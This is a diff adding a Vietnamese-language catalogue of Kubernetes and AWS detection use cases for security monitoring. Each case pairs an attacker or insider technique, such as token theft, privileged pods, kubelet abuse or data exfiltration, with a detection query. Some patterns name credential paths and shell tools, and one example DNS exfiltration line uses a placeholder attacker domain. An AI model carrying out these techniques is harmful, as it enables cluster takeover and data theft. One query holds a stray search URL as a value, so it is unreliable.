@@ -1,0 +1,183 @@
+DETAILED CASE ANALYSIS FOR MAPPING:
+
+--- CASE: tm-010_uc-01 ---
+VN_TITLE: UC-01 (K8s Anomaly Access): Phát hiện truy cập vào K8s API Server từ một Service Account (UserAgent bất thường) thay vì từ các Controller/Component chuẩn của K8s.
+DESC: Hacker RCE vào Pod, dùng curl hoặc kubectl (tự cài) trỏ vào API Server dùng token có sẵn trong /var/run/secrets/.... API log sẽ thấy UserAgent lạ (như curl/7.68) thay vì kube-proxy hay coredns.
+QUERY: user.username STARTSWITH "system:serviceaccount:" AND userAgent NOT STARTSWITH ["kube-controller", "kube-scheduler", "kube-proxy", "coredns"] AND userAgent MATCH ["curl*", "python*", "wget*", "kubectl*"]
+
+--- CASE: tm-010_uc-02 ---
+VN_TITLE: UC-02 (Sensitive K8s Action): Phát hiện Service Account thực hiện tạo Pod mới (Privileged Pod)
+DESC: Từ Pod bị chiếm, hacker dùng SA token để tạo một Pod mới có cờ privileged: true để thoát ra chiếm Host.
+QUERY: user.username STARTSWITH "system:serviceaccount:" AND verb IN ["create", "update", "patch"] AND objectRef.resource IN ["pods", "clusterrolebindings", "secrets"] AND (requestObject CONTAINS "privileged: true" OR requestObject CONTAINS "hostPath")
+
+--- CASE: tm-010_uc-03 ---
+VN_TITLE: UC-03 (Abnomaly Action) Một tiến trình lạ (shell, curl, cat) đọc file token thay vì tiến trình ứng dụng chính (java, node, python), vị trí mặc định: /var/run/secrets/kubernetes.io/serviceaccount/token
+DESC: Kẻ tấn công tìm kiếm Service Account (SA) token trong Pod.
+QUERY: 
+
+--- CASE: tm-010_uc-04 ---
+VN_TITLE: UC-04 (Abnomaly API Call) Kiểm tra quyền hạn của Token.Sử dụng kubectl auth can-i --list hoặc gọi API SelfSubjectAccessReview
+DESC: Kẻ tấn công chạy function để check quyền trên account
+QUERY: (verb="create" AND resource="selfsubjectaccessreviews") OR ("selfsubjectrulesreviews" AND userAgent != "dashboard/kube-proxy" (Thường là curl/python/kubectl))
+
+--- CASE: tm-010_tm-011_tm-012_uc-05 ---
+VN_TITLE: UC-05 (Privileged Flag Usage) Tạo một Pod nâng quyền mới với cấu hình mount: "/"
+DESC: Tạo pod sử dụng cơ chế mount ổ cứng từ root ( / )  để đọc file tùy ý tử node host
+QUERY: verb="create" AND resource="pods" AND requestObject.spec.containers.securityContext.privileged="true" AND requestObject.spec.volumes.hostPath.path="/" AND user.username STARTSWITH "system:serviceaccount"
+
+--- CASE: tm-010_tm-011_tm-012_uc-06 ---
+VN_TITLE: UC-06 (Privileged Flag Usage) Tạo một Pod nâng quyền mới với cấu hình lõng lẻo mount hostPath in [/; /var/run/docker.sock; /run/containerd/containerd.sock; /etc, /root, /var/lib/kubelet] 
+DESC: Kẻ tấn công lạm dụng tính năng này để mount các thư mục nhạy cảm của hệ điều hành Host vào Container. Khi đó, dù đang ở trong Container, kẻ tấn công có thể đọc/ghi trực tiếp lên file hệ thống của máy chủ.
+QUERY: (verb="create" AND resource="pods" AND (spec.volumes.hostPath.path="/" OR hostPath.path STARTWITH ["/etc/kubernetes", "/var/lib/kubelet", "/root", "/etc/shadow"] OR spec.volumes.hostPath.path ENDSWITH ("docker.sock" OR "containerd.sock"))
+
+--- CASE: tm-010_tm-011_tm-013_uc-061 ---
+VN_TITLE: UC-06.1 (Sensitive File Read) Kẻ tấn công đọc các thông tin nhạy cảm sau khi vào tạo được Pod.
+DESC: Kẻ tấn công ghi/đọc các file nhạy cảm sau khi mount. Hoặc đọc file kubelet/pki/* để giả mạo Node Authorizer)
+QUERY: filename in (/root/.ssh/authorized_keys OR /home/*/.ssh/authorized_keys_ ) OR /etc/crontab OR /etc/cron.d/* OR /var/lib/kubelet/pki/* OR kubeconfig 
+
+--- CASE: tm-010_uc-07 ---
+VN_TITLE: UC-07 (Abnomaly API Caller) Kẻ tấn công thực hiện lệnh di chuyển sang pod
+DESC: Kẻ tấn công đang đứng ở Pod A (Pod bị hack ban đầu). Hắn dùng lệnh [kubectl exec; python script ; tạo revershell từ lúc khởi tạo] để chui vào cái Pod B (Pod đặc quyền vừa tạo).
+
+QUERY: verb: create AND objectRef.subresource: exec  AND user.username|startswith: "system:serviceaccount" 
+
+--- CASE: tm-010_uc-08 ---
+VN_TITLE: UC-08 (Network monitor) Kẻ tấn công cấu hình hostNetwork:true để theo dõi traffic trong node. 
+DESC: Kẻ tấn công tạo một Pod (hoặc DaemonSet) với cấu hình hostNetwork: true. Pod này có thể:
+- Bypass Network Policies: Pod này không bị giới hạn bởi các luật tường lửa của Kubernetes (NetworkPolicy), nó nhìn thấy mọi traffic ra vào Node.
+- Access Kubelet API: Nó có thể giao tiếp với localhost:10250 (Kubelet API) mà không cần xác thực (nếu cấu hình Kubelet lỏng lẻo) để ra lệnh cho các Pod khác.
+- Cloud Metadata Access (IMDS): Trên AWS/Azure, Pod này có thể gọi 169.254.169.254 mà không bị chặn, lấy được IAM Role của chính cái Node đó (Node Role thường có quyền đọc ECR, S3, hoặc Discovery). 
+QUERY: verb="create", resource="pods", requestObject.spec.hostNetwork=true
+
+--- CASE: tm-010_uc-09 ---
+VN_TITLE: UC-09 (System Lateral Movement) Kẻ tấn công list các pod trong namespace:kube-system
+DESC: Tìm các Pod quan trọng như CNI Plugin (Calico, Flannel), CSI Driver (EBS CSI), hoặc Kube-Proxy. Các Pod này mặc định thường đã được gán quyền privileged hoặc mount các đường dẫn nhạy cảm từ trước bởi nhà cung cấp. Kẻ tấn công thừa hưởng toàn bộ quyền hạn của Pod hệ thống đó mà không cần tạo mới bất cứ thứ g
+QUERY: verb="create"AND subresource="exec"AND objectRef.namespace="kube-system"
+
+--- CASE: tm-010_uc-10 ---
+VN_TITLE: UC-10 (System Supervisor) Sử dụng MutatingAdmissionWebhook để chỉnh sửa traffic từ pod
+DESC: Với quyền cluster-admin, kẻ tấn công đăng ký một MutatingAdmissionWebhook mới. Cấu hình Webhook này trỏ về một Server do hắn kiểm soát (hoặc một Serverless Function). Mọi yêu cầu phải đi qua webhook để duyệt ->  inject, copy,...
+QUERY: verb IN ["create", "update", "patch"] AND resource="mutatingwebhookconfigurations"
+
+--- CASE: tm-010_uc-11 ---
+VN_TITLE: UC-11 (COREDNS Config) Kẻ tấn công thực hiện sửa configMap cordns để thêm rule 
+DESC: Sau khi có quyền cao, kẻ tấn công truy cập vào namespace kube-system để sửa ConfigMap. Thêm rule Rewrite hoặc hosts để ánh xạ thông tin về IP của bản thân control. Các traffic sẽ được đổ về kẻ tấn công. 
+QUERY: verb IN ["update", "patch"] AND resource="configmaps" AND objectRef.name="coredns" AND objectRef.namespace="kube-system"
+
+--- CASE: tm-018_uc-01 ---
+VN_TITLE: UC-01 (Allow Anonymous Acess) Cấu hình cho phép control Kubelet thông qua API tại cổng 10250 để lại dấu vết trên log Kubelet log
+DESC: Kẻ tấn công (có thể là một máy bị nhiễm mã độc trong cùng mạng LAN hoặc từ Internet nếu port 10250 public) gửi request HTTP trực tiếp tới Kubelet API của Node, bỏ qua hoàn toàn Kubernetes API Server trung tâm. 
+Nếu quản trị viên cấu hình sai (thường gặp ở các cụm self-hosted hoặc bản cũ):
+
+--anonymous-auth=true: Cho phép truy cập mà không cần xác thực (User là system:anonymous).
+
+--authorization-mode=AlwaysAllow: Cho phép mọi User (kể cả Anonymous) làm mọi thứ.
+QUERY: (URI chứa /run/ hoặc /exec/ VÀ User là system:anonymous) OR (URI là /pods OR /stats/summary AND User là system:anonymous AND Method là GET)
+
+
+
+--- CASE: tm-018_uc-02 ---
+VN_TITLE: UC-01 (Allow Anonymous Acess) Cấu hình cho phép control Kubelet thông qua API tại cổng 10250 để lại dấu vết trên log vpc flow
+DESC: tương tự UC-01
+QUERY: DestPort 10250 VÀ SourceIP KHÔNG PHẢI là IP của Master Node (Control Plane). (VPC Flow/ firewall) 
+DestPort 10250 VÀ SourceIP là Public IP (Internet).
+
+--- CASE: tm-029_uc-2901 ---
+VN_TITLE: Phát hiện hành vi lạm dụng quyền Root/Admin để nhảy sang tài khoản thành viên (Lateral Movement).
+DESC: Admin nội bộ (hoặc kẻ chiếm quyền) lạm dụng sts:AssumeRole vào OrganizationAccountAccessRole để chiếm quyền kiểm soát toàn bộ tài khoản con (Member Account).
+QUERY: eventName="AssumeRole" AND requestParameters.roleArn ENDSWITH "OrganizationAccountAccessRole" AND userIdentity.type IN ["Root", "IAMUser"]
+
+--- CASE: tm-029_uc-2902 ---
+VN_TITLE: Phát hiện hành vi sửa đổi Trust Policy để tạo backdoor truy cập lâu dài (Persistence).
+DESC: Admin nội bộ sửa Trust Policy của Role OrganizationAccountAccessRole, thêm tài khoản AWS cá nhân của hắn vào danh sách được phép truy cập để quay lại sau này.
+QUERY: eventName="UpdateAssumeRolePolicy" AND requestParameters.roleName="OrganizationAccountAccessRole" AND requestParameters.policyDocument CONTAINS [External_Account_ID]
+
+--- CASE: tm-029_uc-2903 ---
+VN_TITLE: Phát hiện hành vi vô hiệu hóa hệ thống giám sát từ Role quản trị (Defense Evasion).
+DESC: Sau khi chiếm quyền Member Account, Admin nội bộ tắt CloudTrail/GuardDuty để che giấu hành vi trích xuất dữ liệu sắp tới.
+QUERY: userIdentity.sessionContext.sessionIssuer.userName="OrganizationAccountAccessRole" AND eventName IN ["StopLogging", "DeleteTrail", "DeleteDetector", "DeleteFlowLogs"]
+
+--- CASE: tm-039_uc-3901 ---
+VN_TITLE: Phát hiện hành vi trích xuất dữ liệu S3/Database thông qua Role quản trị AWS Organization.
+DESC: Kẻ tấn công sử dụng quyền AdministratorAccess của Role để public S3 Bucket chứa dữ liệu Core Banking hoặc tạo Presigned URL để tải dữ liệu về máy cá nhân.
+QUERY: userIdentity.sessionContext.sessionIssuer.userName="OrganizationAccountAccessRole" AND eventName IN ["PutBucketPolicy", "GetObject", "CreatePresignedUrl"] AND resources.ARN CONTAINS "banking-data[ví dụ]"
+
+--- CASE: tm-039_uc-3902 ---
+VN_TITLE: Phát hiện tạo User phụ để truy cập dữ liệu (nhằm né tránh giám sát Role chính).
+DESC: Thay vì dùng trực tiếp Role để lấy dữ liệu (dễ bị lộ), kẻ tấn công tạo một IAM User mới, gán quyền đọc dữ liệu Banking và dùng User đó để exfiltrate.
+QUERY: userIdentity.sessionContext.sessionIssuer.userName="OrganizationAccountAccessRole" AND eventName="CreateUser"
+
+--- CASE: tm-039_uc-3903 ---
+VN_TITLE: Snapshot Sharing Exfiltration: Chia sẻ bản sao lưu (Snapshot) của ổ cứng/database ra ngoài.
+DESC: Kẻ nội bộ tạo Snapshot của RDS hoặc EBS chứa dữ liệu nhạy cảm, sau đó dùng tính năng "Modify Permissions" để chia sẻ Snapshot đó với tài khoản AWS cá nhân của hắn.
+QUERY: eventName IN ["ModifySnapshotAttribute", "ModifyDBSnapshotAttribute"]AND requestParameters.createVolumePermission.add.items.userId != [Org_Account_IDs]
+
+--- CASE: tm-039_uc-3904 ---
+VN_TITLE: Malicious Replication: Thiết lập tự động sao chép dữ liệu S3 sang Bucket lạ.
+DESC: Kẻ nội bộ cấu hình S3 Replication Rule để mọi object mới được upload vào Bucket công ty sẽ tự động được AWS sao chép sang một Bucket do hacker kiểm soát.
+QUERY: eventName="PutBucketReplication"AND requestParameters.ReplicationConfiguration.Rule.Destination.Bucket != [Trusted_Buckets]
+
+--- CASE: tm-039_uc-3905 ---
+VN_TITLE: Direct Download via CLI: Tải dữ liệu hàng loạt về máy cá nhân (Bulk Download).
+DESC: Kẻ nội bộ dùng AWS CLI với lệnh aws s3 sync để tải toàn bộ nội dung Bucket về máy trạm (laptop) của hắn.
+QUERY: eventName="GetObject"AND userAgent CONTAINS "aws-cli"AND sourceIPAddress NOT IN [VPN_IPs, Office_IPs](Cần bật S3 Data Events)
+
+--- CASE: tm-039_uc-3906 ---
+VN_TITLE: EC2 Proxy Exfiltration: Dùng máy chủ EC2 để đẩy dữ liệu lên Google Drive/Dropbox.
+DESC: Kẻ nội bộ SSH vào một EC2 có quyền truy cập dữ liệu, sau đó dùng curl hoặc cài rclone để upload dữ liệu lên Cloud Storage cá nhân (né DLP mạng văn phòng).
+QUERY: VPC Flow: srcAddr=[EC2_Private_IP] AND bytesOut > [Threshold]DNS: query IN ["drive.google.com", "dropbox.com", "mega.nz"]
+
+--- CASE: tm-039_uc-3907 ---
+VN_TITLE: RDS Export to External S3: Xuất dữ liệu Database native sang S3 lạ.
+DESC: Kẻ nội bộ dùng tính năng start-export-task của RDS (Aurora/Snapshot) để dump toàn bộ DB sang một S3 Bucket thuộc AWS Account của hắn.
+QUERY: eventName IN ["StartExportTask", "StartExportTaskForSnapshot"]AND requestParameters.s3BucketName != [List_Trusted_Buckets]
+
+--- CASE: tm-039_uc-3908 ---
+VN_TITLE: CloudShell Abuse: Dùng CloudShell để bypass Network Filter.
+DESC: Kẻ nội bộ mở AWS CloudShell (có sẵn aws-cli, python, curl). Vì CloudShell chạy trong VPC quản lý bởi AWS, nó thường không bị chặn bởi Firewall công ty. Hắn tải dữ liệu về shell rồi đẩy ra ngoài.
+QUERY: eventName="CreateEnvironment"AND sourceIPAddress="https://www.google.com/search?q=cloudshell.amazonaws.com"(Cảnh báo: Rất khó bắt hành vi bên trong shell, chỉ bắt được việc khởi tạo)
+
+--- CASE: tm-039_uc-3909 ---
+VN_TITLE: Lambda Function Exfil: Dùng Serverless code để đẩy dữ liệu.
+DESC: Kẻ nội bộ tạo một Lambda Function, code bên trong thực hiện query Database/S3 rồi POST dữ liệu ra API bên ngoài (reqbin, webhook.site).
+QUERY: CloudTrail: eventName IN ["CreateFunction", "UpdateFunctionCode"]VPC Flow: srcAddr=[Lambda_Network_Interface] AND dstAddr=[External_IP]
+
+--- CASE: tm-039_uc-3910 ---
+VN_TITLE: Route53 DNS Exfiltration: Trích xuất qua truy vấn DNS.
+DESC: Khi bị chặn internet, kẻ nội bộ encode dữ liệu thành chuỗi Base64 và query DNS (ví dụ: nslookup <data>.hacker.com). Data đi qua cổng 53 thường bị bỏ qua.
+QUERY: GuardDuty: type="DefenseEvasion:EC2/DNSDataExfiltration"Route53 Logs: queryName length > 50 chars AND queryType="TXT"
+
+--- CASE: tm-039_uc-3911 ---
+VN_TITLE: SSM Session Manager: Đọc file qua kênh quản trị HTTPS.
+DESC: Thay vì SSH (port 22) dễ bị giám sát, kẻ nội bộ dùng SSM Session Manager để kết nối vào EC2, đọc file và copy nội dung về máy local qua session log.
+QUERY: eventName="StartSession"AND requestParameters.documentName IN ["AWS-StartPortForwardingSession", "AWS-StartSSMSession"]
+
+--- CASE: tm-039_uc-3912 ---
+VN_TITLE: ECR Cross-Account Push: Đẩy Docker Image chứa dữ liệu sang tài khoản khác.
+DESC: Kẻ nội bộ đóng gói dữ liệu vào một layer của Docker Image, sau đó login vào ECR của tài khoản AWS cá nhân và docker push image đó lên.
+QUERY: eventName="GetAuthorizationToken" (Login ECR lạ)OR (eventName="PutImage" AND resources.repositoryName NOT IN [Approved_Repos])
+
+--- CASE: tm-039_uc-3913 ---
+VN_TITLE: DMS Exfiltration: Dùng Database Migration Service để đồng bộ dữ liệu ra ngoài.
+DESC: DMS sinh ra để chuyển data. Kẻ nội bộ tạo một ReplicationInstance và Endpoint đích trỏ về Database server bên ngoài của hắn, sau đó chạy Task migrate data đi.
+QUERY: eventName IN ["CreateReplicationInstance", "CreateEndpoint"]AND requestParameters.endpointType="TARGET"AND requestParameters.serverName != [Internal_Subnets]
+
+--- CASE: tm-039_uc-3914 ---
+VN_TITLE: VPC Traffic Mirroring: "Nghe lén" toàn bộ traffic mạng.
+DESC: Nếu có quyền cao, kẻ nội bộ cấu hình tính năng Traffic Mirroring để sao chép toàn bộ gói tin (packets) từ máy chủ quan trọng gửi về một ENI do hắn kiểm soát để phân tích (Sniffing).
+QUERY: eventName IN ["CreateTrafficMirrorSession", "CreateTrafficMirrorTarget"]
+
+--- CASE: tm-039_uc-3915 ---
+VN_TITLE: RAM Sharing Abuse: Chia sẻ tài nguyên mạng/storage qua Resource Access Manager.
+DESC: Kẻ nội bộ dùng AWS RAM để chia sẻ Subnet hoặc Transit Gateway với tài khoản bên ngoài, tạo đường hầm mạng trực tiếp giữa 2 tài khoản để tuồn dữ liệu.
+QUERY: eventName="EnableSharingWithAwsOrganization"OR (eventName="CreateResourceShare" AND requestParameters.principals != [My_Org_ID])
+
+--- CASE: tm-039_uc-3916 ---
+VN_TITLE: DynamoDB Streams to Lambda: Trigger dữ liệu thay đổi ra ngoài.
+DESC: Kẻ nội bộ bật DynamoDB Stream và gắn một Lambda Function vào đó. Mỗi khi có dữ liệu mới được ghi vào DB, Lambda tự động gửi bản copy ra ngoài.
+QUERY: eventName="UpdateTable"AND requestParameters.streamSpecification.streamEnabled=true (Kết hợp check Lambda Event Source Mapping)
+
+--- CASE: tm-039_uc-3917 ---
+VN_TITLE: CloudFormation Custom Resource: Chạy code độc hại khi deploy stack.
+DESC: Kẻ nội bộ upload một template CloudFormation có chứa Custom Resource (thực chất là Lambda Backed). Khi Stack được tạo, code Lambda chạy và gửi biến môi trường (chứa Credential/Data) ra ngoài.
+QUERY: eventName="CreateStack"AND requestParameters.templateBody CONTAINS "AWS::CloudFormation::CustomResource"
